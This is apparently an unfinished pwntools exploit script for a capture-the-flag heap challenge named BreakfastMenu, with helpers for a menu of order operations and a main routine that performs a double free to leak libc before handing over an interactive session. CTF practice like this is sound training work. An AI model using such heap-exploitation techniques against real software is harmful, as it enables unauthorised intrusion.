from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['wt.exe', '-w', '0', 'split-pane', 'wsl.exe', '-d', 'Ubuntu']

if sys.argv[1] == 'remote':
    p = remote('breakfast.sdc.tf', 1337)
else:
    p = process('./BreakfastMenu')
    if len(sys.argv) == 3 and sys.argv[2] == 'debug':
        gdb.attach(p, '''
            b main
            ''')

def add_order():
    p.recvuntil(b"4. Pay your bill and leave")
    p.sendline(b"1")

def edit_order(idx, order_text):
    p.recvuntil(b"4. Pay your bill and leave")
    p.sendline(b"2")
    p.recvuntil(b"which order would you like to modify")
    p.sendline(str(idx).encode())
    p.recvuntil(b"What would you like to order?")
    p.sendline(order_text)

def delete_order(idx):
    p.recvuntil(b"4. Pay your bill and leave")
    p.sendline(b"3")
    p.recvuntil(b"which order would you like to remove")
    p.sendline(str(idx).encode())

def main():
    # double free to leak libc
    add_order()
    delete_order(0)
    delete_order(0)

    p.interactive()

if __name__ == '__main__':
    main()